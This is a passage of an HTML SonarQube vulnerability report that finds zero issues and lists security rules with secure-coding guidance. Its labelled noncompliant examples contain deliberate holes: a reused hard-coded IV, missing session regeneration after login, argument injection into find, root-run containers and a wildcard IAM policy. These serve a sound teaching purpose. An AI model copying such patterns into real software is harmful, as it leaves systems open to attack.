<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>SonarQube Vulnerability Report</title>
  <style>
    /*
	The sss stylesheet is released under the MIT license.
	<https://github.com/Thiht/sss>
	*/
    pre,
td,
th {
    padding: 5px 10px
}

code,
hr,
pre,
thead {
    background: #EEE
}

body {
    color: #333;
    font-family: 'Segoe UI', 'Lucida Grande', Helvetica, sans-serif;
    line-height: 1.5;
}

div.summup {
    max-width: 800px;
    margin: 50px auto;
}

div.detail {
    padding: 20px;
}

h1,
h2,
h3,
h4,
h5,
h6 {
    font-weight: 400;
    line-height: 1em;
    margin: 20px 0
}

h1 {
    font-size: 2.25em
}

h2 {
    font-size: 1.75em
}

h3 {
    font-size: 1.5em
}

h4,
h5,
h6 {
    font-size: 1.25em
}

a {
    color: #08C;
    text-decoration: none
}

a:focus,
a:hover {
    text-decoration: underline
}

a:visited {
    color: #058
}

img {
    max-width: 100%
}

li + li {
    margin-top: 3px
}

dt {
    font-weight: 700
}

code {
    font-family: Consolas, "Lucida Console", monospace;
    padding: 1px 5px
}

pre {
    white-space: pre-wrap
}

pre code {
    padding: 0
}

blockquote {
    border-left: 5px solid #EEE;
    margin: 0;
    padding: 0 10px
}

table {
    border-collapse: collapse;
    width: 100%
}

table + table {
    margin-top: 1em
}

thead {
    text-align: left
}

td,
th {
    border: 1px solid #EEE
}

td.component {
    word-break: break-all;
}

hr {
    border: 0;
    height: 1px
}

.banner {
    text-align: center;
}

canvas {
    display: block;
    margin: 10px auto;
}

.statusOK {
    background-color: #0a0
}

.statusERROR {
    background-color: #d4333f
}

.sevBLOCKER {
    background-color: #2c3e50
}

.sevCRITICAL {
    background-color: #d43223
}

.sevMAJOR {
    background-color: #f39c12
}

.sevMINOR {
    background-color: #319ddb
}

.hidden {
    display: none;
}

.rulestable {
    table-layout: fixed; word-wrap: break-word
}


  </style>
</head>

<body>
  <div class="summup">
    <!-- insert your company banner here -->
    <!--
		<p class="banner">
			<a href="https://www.soprasteria.com/" target="_blank">
				<img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Sopra_Steria_logo.svg/1280px-Sopra_Steria_logo.svg.png" alt="Sopra Steria" height="50">
			</a>
		</p>
		-->

    <h1>SonarQube Vulnerability Report</h1>

    <dl>
      <dt>Report Generated On</dt>
      <dd>
        Thursday, Sep 21, 2023
      </dd>

      <dt>Project Name/URL</dt>
      <dd>
        <a href="https://sonarcloud.io/dashboard?id=soprasteria_sonar-report" target="_blank">Sonar Report</a>
      </dd>

      <dt>Application</dt>
      <dd>
        sonar-report
      </dd>

      <dt>Release</dt>
      <dd>
        1.0.0
      </dd>

      <dt>Branch</dt>
      <dd>
        master
      </dd>

      <dt>Delta Analysis</dt>
      <dd>
        No
      </dd>

      

      
    </dl>

    

    <h2>Summary of the Detected Vulnerabilities
    </h2>
    <table>
      <thead>
        <tr>
          <th></th>
          <th>Severity</th>
          <th>Number of Issues</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="sevBLOCKER"></td>
          <td>BLOCKER</td>
          <td>
            0
          </td>
        </tr>
        <tr>
          <td class="sevCRITICAL"></td>
          <td>CRITICAL</td>
          <td>
            0
          </td>
        </tr>
        <tr>
          <td class="sevMAJOR"></td>
          <td>MAJOR</td>
          <td>
            0
          </td>
        </tr>
        <tr>
          <td class="sevMINOR"></td>
          <td>MINOR</td>
          <td>
            0
          </td>
        </tr>
      </tbody>
    </table>

    
  </div>

  <div class=detail>
    

    
    <h3>Known Security Rules</h3>
    <table class="rulestable">
      <thead>
        <tr>
          <th>Rule</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S3884">
              vbnet:S3884
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked
immediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has
already been set.</p>
<p>Specifically, these methods are meant to be called from non-managed code such as a C&#43;&#43; wrapper that then invokes the managed, i.e. C# or VB.NET,
code.</p>
<h3>Noncompliant code example</h3>
<pre>
Public Class Noncompliant

    &lt;DllImport(&#34;ole32.dll&#34;)&gt;
    Public Shared Function CoSetProxyBlanket(&lt;MarshalAs(UnmanagedType.IUnknown)&gt;pProxy As Object, dwAuthnSvc as UInt32, dwAuthzSvc As UInt32, &lt;MarshalAs(UnmanagedType.LPWStr)&gt; pServerPrincName As String, dwAuthnLevel As UInt32, dwImpLevel As UInt32, pAuthInfo As IntPtr, dwCapabilities As UInt32) As Integer
    End Function

    Public Enum RpcAuthnLevel
        [Default] &#61; 0
        None &#61; 1
        Connect &#61; 2
        [Call] &#61; 3
        Pkt &#61; 4
        PktIntegrity &#61; 5
        PktPrivacy &#61; 6
    End Enum

    Public Enum RpcImpLevel
        [Default] &#61; 0
        Anonymous &#61; 1
        Identify &#61; 2
        Impersonate &#61; 3
        [Delegate] &#61; 4
    End Enum

    Public Enum EoAuthnCap
        None &#61; &amp;H00
        MutualAuth &#61; &amp;H01
        StaticCloaking &#61; &amp;H20
        DynamicCloaking &#61; &amp;H40
        AnyAuthority &#61; &amp;H80
        MakeFullSIC &#61; &amp;H100
        [Default] &#61; &amp;H800
        SecureRefs &#61; &amp;H02
        AccessControl &#61; &amp;H04
        AppID &#61; &amp;H08
        Dynamic &#61; &amp;H10
        RequireFullSIC &#61; &amp;H200
        AutoImpersonate &#61; &amp;H400
        NoCustomMarshal &#61; &amp;H2000
        DisableAAA &#61; &amp;H1000
    End Enum

    &lt;DllImport(&#34;ole32.dll&#34;)&gt;
    Public Shared Function CoInitializeSecurity(pVoid As IntPtr, cAuthSvc As Integer, asAuthSvc As IntPtr, pReserved1 As IntPtr, level As RpcAuthnLevel, impers As RpcImpLevel, pAuthList As IntPtr, dwCapabilities As EoAuthnCap, pReserved3 As IntPtr) As Integer
    End Function

    Public Sub DoSomething()
        Dim Hres1 As Integer &#61; CoSetProxyBlanket(Nothing, 0, 0, Nothing, 0, 0, IntPtr.Zero, 0) &#39; Noncompliant
        Dim Hres2 As Integer &#61; CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None, RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero) &#39; Noncompliant
    End Sub

End Class
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/648" rel="nofollow">MITRE, CWE-648</a> - Incorrect Use of Privileged APIs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3884">
              csharpsquid:S3884
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked
immediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has
already been set.</p>
<p>Specifically, these methods are meant to be called from non-managed code such as a C&#43;&#43; wrapper that then invokes the managed, i.e. C# or VB.NET,
code.</p>
<h3>Noncompliant code example</h3>
<pre>
[DllImport(&#34;ole32.dll&#34;)]
static extern int CoSetProxyBlanket([MarshalAs(UnmanagedType.IUnknown)]object pProxy, uint dwAuthnSvc, uint dwAuthzSvc,
	[MarshalAs(UnmanagedType.LPWStr)] string pServerPrincName, uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo,
	uint dwCapabilities);

public enum RpcAuthnLevel
{
	Default &#61; 0,
	None &#61; 1,
	Connect &#61; 2,
	Call &#61; 3,
	Pkt &#61; 4,
	PktIntegrity &#61; 5,
	PktPrivacy &#61; 6
}

public enum RpcImpLevel
{
	Default &#61; 0,
	Anonymous &#61; 1,
	Identify &#61; 2,
	Impersonate &#61; 3,
	Delegate &#61; 4
}

public enum EoAuthnCap
{
	None &#61; 0x00,
	MutualAuth &#61; 0x01,
	StaticCloaking &#61; 0x20,
	DynamicCloaking &#61; 0x40,
	AnyAuthority &#61; 0x80,
	MakeFullSIC &#61; 0x100,
	Default &#61; 0x800,
	SecureRefs &#61; 0x02,
	AccessControl &#61; 0x04,
	AppID &#61; 0x08,
	Dynamic &#61; 0x10,
	RequireFullSIC &#61; 0x200,
	AutoImpersonate &#61; 0x400,
	NoCustomMarshal &#61; 0x2000,
	DisableAAA &#61; 0x1000
}

[DllImport(&#34;ole32.dll&#34;)]
public static extern int CoInitializeSecurity(IntPtr pVoid, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1,
	RpcAuthnLevel level, RpcImpLevel impers, IntPtr pAuthList, EoAuthnCap dwCapabilities, IntPtr pReserved3);

static void Main(string[] args)
{
	var hres1 &#61; CoSetProxyBlanket(null, 0, 0, null, 0, 0, IntPtr.Zero, 0); // Noncompliant

	var hres2 &#61; CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None,
		RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero); // Noncompliant
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/648" rel="nofollow">MITRE, CWE-648</a> - Incorrect Use of Privileged APIs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6471">
              docker:S6471
            </a>
          </td>
          <td>
            <details>
              <p>Running containers as a privileged user weakens their runtime security, allowing any user whose code runs on the container to perform
administrative actions.<br /> In Linux containers, the privileged user is usually named <code>root</code>. In Windows containers, the equivalent is
<code>ContainerAdministrator</code>.</p>
<p>A malicious user can run code on a system either thanks to actions that could be deemed legitimate - depending on internal business logic or
operational management shells - or thanks to malicious actions. For example, with arbitrary code execution after exploiting a service that the
container hosts.</p>
<p>Suppose the container is not hardened to prevent using a shell, interpreter, or <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">Linux capabilities</a>. In this case, the malicious user can read and exfiltrate any
file (including Docker volumes), open new network connections, install malicious software, or, worse, break out of the container’s isolation context
by exploiting other components.</p>
<p>This means giving the possibility to attackers to steal important infrastructure files, intellectual property, or personal data.</p>
<p>Depending on the infrastructure’s resilience, attackers may then extend their attack to other services, such as Kubernetes clusters or cloud
providers, in order to maximize their reach.</p>
<h2>Ask Yourself Whether</h2>
<p>This container:</p>
<ul><li> Serves services accessible from the Internet. </li><li> Does not require a privileged user to run. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In the Dockerfile:</p>
<ul><li> Create a new default user and use it with the <code>USER</code> statement.
    <ul><li> Some container maintainers create a specific user to be used without explicitly setting it as default, such as <code>postgresql</code> or
      <code>zookeeper</code>. It is recommended to use these users instead of root. </li><li> On Windows containers, the <code>ContainerUser</code> is available for this purpose. </li></ul>  </li></ul>
<p>Or, at launch time:</p>
<ul><li> Use the <code>user</code> argument when calling Docker or in the docker-compose file. </li><li> Add fine-grained Linux capabilities to perform specific actions that require root privileges. </li></ul>
<p>If this image is already explicitly set to launch with a non-privileged user, you can add it to the safe images list rule property of your
SonarQube instance, without the tag.</p>
<h2>Sensitive Code Example</h2>
<p>For any image that does not provide a user by default, regardless of their underlying operating system:</p>
<pre>
# Sensitive
FROM alpine

ENTRYPOINT [&#34;id&#34;]
</pre>
<p>For multi-stage builds, the last stage is non-compliant if it does not contain the <code>USER</code> instruction with a non-root user:</p>
<pre>
FROM alpine AS builder
COPY Makefile ./src /
RUN make build
USER nonroot

# Sensitive, previous user settings are dropped
FROM alpine AS runtime
COPY --from&#61;builder bin/production /app
ENTRYPOINT [&#34;/app/production&#34;]
</pre>
<h2>Compliant Solution</h2>
<p>For Linux-based images:</p>
<pre>
FROM alpine

RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot

USER nonroot

ENTRYPOINT [&#34;id&#34;]
</pre>
<p>For Windows-based images, you can use <code>ContainerUser</code> or create a new user:</p>
<pre>
FROM mcr.microsoft.com/windows/servercore:ltsc2019

RUN net user /add nonroot

USER nonroot
</pre>
<p>If the <code>scratch</code> Dockerfile untars a Linux distribution, the &#34;Linux image&#34; solution should be applied. Else, you have a choice between
using a pre-written <code>/etc/passwd</code> file (regardless of the host operating system) or using a multi-stage build.</p>
<pre>
FROM scratch

COPY etc_passwd /etc/passwd
# contains &#34;nonroot:x:1337:1337:nonroot:/nonroot:/usr/sbin/nologin&#34;

USER nonroot

COPY production_binary /app

ENTRYPOINT [&#34;/app/production_binary&#34;]
</pre>
<p>or you can use a multi-stage build:</p>
<pre>
FROM alpine:latest as security_provider
RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot

FROM scratch as production
COPY --from&#61;security_provider /etc/passwd /etc/passwd
USER nonroot
COPY production_binary /app
ENTRYPOINT [&#34;/app/production_binary&#34;]
</pre>
<p>For multi-stage builds:</p>
<pre>
FROM alpine as builder
COPY Makefile ./src /
RUN make build

FROM alpine as runtime
RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot
COPY --from&#61;builder bin/production /app
USER nonroot
ENTRYPOINT [&#34;/app/production&#34;]
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284.html" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://hub.docker.com/r/nginxinc/nginx-unprivileged" rel="nofollow">nginxinc/nginx-unprivileged: Example of a non-root container by default</a>
  </li><li> <a href="https://learn.microsoft.com/en-us/virtualization/windowscontainers/manage-containers/container-security#when-to-use-containeradmin-and-containeruser-user-accounts" rel="nofollow">Microsoft docs, When to use ContainerAdmin and ContainerUser user accounts</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6350">
              roslyn.sonaranalyzer.security.cs:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
using System.Diagnostics;
Process p &#61; new Process();
p.StartInfo.FileName &#61; &#34;/usr/bin/find&#34;;
p.StartInfo.ArgumentList.Add(input); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
using System.Diagnostics;
Process p &#61; new Process();
p.StartInfo.FileName &#61; &#34;/usr/bin/find&#34;;
if (allowed.Contains(input)) {
  p.StartInfo.ArgumentList.Add(input);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S3329">
              vbnet:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a &#34;starting variable&#34; (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.IO
Imports System.Security.Cryptography

Public Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)
    Dim aes &#61; New AesCryptoServiceProvider()

    Dim iv &#61; New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
    Dim encryptor &#61; aes.CreateEncryptor(key, iv) &#39; Noncompliant

    Dim cryptoStream &#61; New CryptoStream(target, encryptor, CryptoStreamMode.Write)
    Dim swEncrypt &#61; New StreamWriter(cryptoStream)

    swEncrypt.Write(dataToEncrypt)
End Sub
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.IO
Imports System.Security.Cryptography

Public Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)
    Dim aes &#61; New AesCryptoServiceProvider()

    Dim encryptor &#61; aes.CreateEncryptor(key, aes.IV)

    Dim cryptoStream &#61; New CryptoStream(target, encryptor, CryptoStreamMode.Write)
    Dim swEncrypt &#61; New StreamWriter(cryptoStream)

    swEncrypt.Write(dataToEncrypt)
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul><li> IVs must be unique for each encryption operation. </li><li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li></ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br /> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/329" rel="nofollow">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5876">
              typescript:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul><li> When a user visits a website or logs in, a session is created for them. </li><li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li><li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li><li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li><li> At this point, the attacker can hijack and impersonate the victim’s session. </li></ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h2>How to fix it in Passport</h2>
<h3>Code examples</h3>
<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve
this by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user
is assigned a new and unique session ID.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
app.post(&#39;/login&#39;,
  passport.authenticate(&#39;local&#39;, { failureRedirect: &#39;/login&#39; }),
  function(req, res) {
    // Noncompliant - no session.regenerate after login
    res.redirect(&#39;/&#39;);
  });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
app.post(&#39;/login&#39;,
  passport.authenticate(&#39;local&#39;, { failureRedirect: &#39;/login&#39; }),
  function(req, res) {
    let prevSession &#61; req.session;
    req.session.regenerate((err) &#61;&gt; {
      Object.assign(req.session, prevSession);
      res.redirect(&#39;/&#39;);
    });
  });
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol><li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li><li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li><li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li><li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li><li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li></ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="http://expressjs.com/en/resources/middleware/session.html" rel="nofollow">express-session</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d" rel="nofollow">Fixing Session Fixation</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li><li> <a href="https://owasp.org/www-community/attacks/Session_fixation" rel="nofollow">OWASP Sesssion Fixation</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6317">
              typescript:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>&#34;*&#34;</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS CDK</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: [&#34;lambda:UpdateFunctionCode&#34;],
        resources: [&#34;*&#34;], // Noncompliant
    })],
});
